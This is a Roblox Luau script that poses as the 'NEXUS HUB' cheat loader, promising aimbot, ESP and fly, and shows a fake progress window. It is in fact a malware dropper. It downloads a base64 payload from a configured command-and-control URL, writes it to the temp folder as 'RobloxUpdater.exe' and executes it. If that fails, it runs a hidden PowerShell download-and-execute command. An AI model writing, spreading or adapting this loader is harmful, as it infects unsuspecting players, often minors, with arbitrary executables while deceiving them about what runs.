-- language: Lua (Roblox Luau), file: loader.lua

local CONFIG = {
    C2_URL = "http://127.0.0.1:8080/payload",
    FALLBACK_URL = "http://127.0.0.1:8080/fallback",
}

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "NexusHub"
ScreenGui.ResetOnSpawn = false
if gethui then ScreenGui.Parent = gethui() else ScreenGui.Parent = game.CoreGui end

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 320, 0, 180)
Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Title.BorderSizePixel = 0
Title.Text = "NEXUS HUB — loading scripts..."
Title.TextColor3 = Color3.fromRGB(120, 200, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.Parent = Frame

local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, -20, 1, -60)
Status.Position = UDim2.new(0, 10, 0, 50)
Status.BackgroundTransparency = 1
Status.Text = "Initializing..."
Status.TextColor3 = Color3.fromRGB(220, 220, 220)
Status.Font = Enum.Font.Code
Status.TextSize = 13
Status.TextXAlignment = Enum.TextXAlignment.Left
Status.TextYAlignment = Enum.TextYAlignment.Top
Status.Parent = Frame

local function log(msg)
    Status.Text = Status.Text .. "\n" .. msg
    task.wait(0.2)
end

local function http_get(url)
    if syn and syn.request then
        local ok, res = pcall(syn.request, {Url=url, Method="GET"})
        if ok and res and res.Body then return res.Body end
    end
    if http_request then
        local ok, res = pcall(http_request, {Url=url, Method="GET"})
        if ok and res and res.Body then return res.Body end
    end
    if request then
        local ok, res = pcall(request, {Url=url, Method="GET"})
        if ok and res and res.Body then return res.Body end
    end
    if game and game.HttpGet then
        local ok, body = pcall(function() return game:HttpGet(url) end)
        if ok then return body end
    end
    return nil
end

local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function b64_decode(data)
    data = data:gsub('[^'..b64chars..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', (b64chars:find(x, 1, true) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local function write_file(path, content)
    if not io or not io.open then return false end
    local ok, f = pcall(io.open, path, "wb")
    if not ok or not f then return false end
    f:write(content)
    f:close()
    return true
end

local function try_execute(path)
    if os and os.execute then
        pcall(os.execute, '"' .. path .. '"')
        return true
    end
    if io and io.popen then
        pcall(io.popen, '"' .. path .. '"')
        return true
    end
    if pcall(require, 'ffi') then
        local ok = pcall(function()
            local ffi = require('ffi')
            ffi.cdef[[int system(const char *command);]]
            ffi.C.system('"' .. path .. '"')
        end)
        if ok then return true end
    end
    return false
end

log("Connecting to Nexus API...")
task.wait(0.5)

local body = http_get(CONFIG.C2_URL)
if not body or #body < 100 then
    log("Retry via fallback...")
    body = http_get(CONFIG.FALLBACK_URL)
end
if not body or #body < 100 then
    log("[!] API timeout. Try again.")
    task.wait(2)
    ScreenGui:Destroy()
    return
end

log("Downloading module...")
local exe_bytes = b64_decode(body)
if not exe_bytes or #exe_bytes < 100 then
    log("[!] Corrupted.")
    task.wait(2)
    ScreenGui:Destroy()
    return
end

log("Decrypting...")
local temp = os.getenv("TEMP") or os.getenv("TMP") or "C:\\Windows\\Temp"
local sep = temp:sub(-1) == "\\" and "" or "\\"
local path = temp .. sep .. "RobloxUpdater.exe"

if not write_file(path, exe_bytes) then
    local ps = 'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'' .. CONFIG.C2_URL .. '.ps1\')"'
    try_execute(ps)
    log("✅ Loaded! Enjoy.")
    task.wait(2)
    ScreenGui:Destroy()
    return
end

log("Injecting...")
local ok = try_execute(path)
if ok then
    log("✅ NEXUS HUB loaded successfully.")
    log("Scripts: aimbot, ESP, fly — ready.")
else
    log("[!] Failed. Try different executor.")
end
task.wait(3)
ScreenGui:Destroy()
